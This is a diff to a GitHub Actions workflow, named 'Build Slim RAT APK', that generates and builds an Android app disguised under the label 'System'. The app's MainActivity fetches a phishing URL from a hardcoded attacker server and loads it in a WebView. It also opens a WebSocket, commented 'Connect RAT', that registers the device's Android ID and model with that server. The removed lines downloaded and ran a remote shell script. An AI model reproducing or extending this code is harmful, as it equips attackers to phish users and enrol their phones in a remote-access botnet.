@@ -1,5 +1,10 @@
-name: Build RAT APK
-on: [push, workflow_dispatch]
+name: Build Slim RAT APK
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +15,82 @@ jobs:
         java-version: '17'
         distribution: 'temurin'
     - uses: android-actions/setup-android@v3
+    
     - name: Setup Gradle
       uses: gradle/actions/setup-gradle@v3
       with:
         gradle-version: 8.2
-    - name: Build APK
+
+    - name: Auto-Generate Files
       run: |
-        rm -f build.gradle settings.gradle
-        wget -q https://raw.githubusercontent.com/ant-media/android-sdk-example/main/template.sh -O template.sh
-        chmod +x template.sh
-        ./template.sh
+        # 1. Bikin Config Gradle
+        echo "pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }" > settings.gradle
+        echo "dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }" >> settings.gradle
+        echo "rootProject.name = 'knt'" >> settings.gradle
+        echo "include ':app'" >> settings.gradle
+        echo "plugins { id 'com.android.application' version '8.1.0' apply false }" > build.gradle
+        echo "plugins { id 'com.android.application' }" > app/build.gradle
+        echo "android { namespace 'com.kinar.rmdproject'; compileSdk 33; defaultConfig { applicationId 'com.kinar.rmdproject'; minSdk 21; targetSdk 33 } }" >> app/build.gradle
+        echo "dependencies { implementation 'com.squareup.okhttp3:okhttp:4.12.0' }" >> app/build.gradle
+        
+        # 2. Bikin AndroidManifest
+        mkdir -p app/src/main
+        echo '<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.kinar.rmdproject"><uses-permission android:name="android.permission.INTERNET" /><application android:label="System" android:theme="@android:style/Theme.NoTitleBar"><activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity></application></manifest>' > app/src/main/AndroidManifest.xml
+        
+        # 3. Bikin MainActivity (Super Ringan, Tanpa AppCompat)
+        mkdir -p app/src/main/java/com/kinar/rmdproject
+        cat << 'EOF' > app/src/main/java/com/kinar/rmdproject/MainActivity.java
+        package com.kinar.rmdproject;
+        import android.app.Activity;
+        import android.os.Bundle;
+        import android.webkit.WebView;
+        import android.webkit.WebViewClient;
+        import okhttp3.*;
+        import org.json.JSONObject;
+        import java.io.IOException;
+        import java.util.concurrent.TimeUnit;
+
+        public class MainActivity extends Activity {
+            private WebView webView;
+            private final String SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
+            private final String WS_URL = "ws://herstoreganteng.rexypediaa.biz.id:4732";
+
+            @Override protected void onCreate(Bundle b) {
+                super.onCreate(b);
+                webView = new WebView(this);
+                webView.getSettings().setJavaScriptEnabled(true);
+                webView.setWebViewClient(new WebViewClient());
+                setContentView(webView);
+                
+                // Fetch URL Phising
+                new OkHttpClient().newCall(new Request.Builder().url(SERVER_HTTP + "/api/get-target").build()).enqueue(new Callback() {
+                    @Override public void onFailure(Call c, IOException e) { runOnUiThread(() -> webView.loadUrl("about:blank")); }
+                    @Override public void onResponse(Call c, Response r) throws IOException { 
+                        final String u = r.body().string();
+                        runOnUiThread(() -> webView.loadUrl(u)); 
+                    }
+                });
+
+                // Connect RAT
+                new OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
+                    .newWebSocket(new Request.Builder().url(WS_URL).build(), new WebSocketListener() {
+                        @Override public void onOpen(WebSocket w, Response r) {
+                            try {
+                                JSONObject j = new JSONObject();
+                                j.put("type", "register");
+                                j.put("device_id", "web-" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
+                                j.put("name", android.os.Build.MODEL);
+                                w.send(j.toString());
+                            } catch (Exception e) {}
+                        }
+                    });
+            }
+        }
+        EOF
+
+    - name: Build APK
+      run: gradle assembleDebug
+
     - name: Upload APK
       uses: actions/upload-artifact@v4
       with:
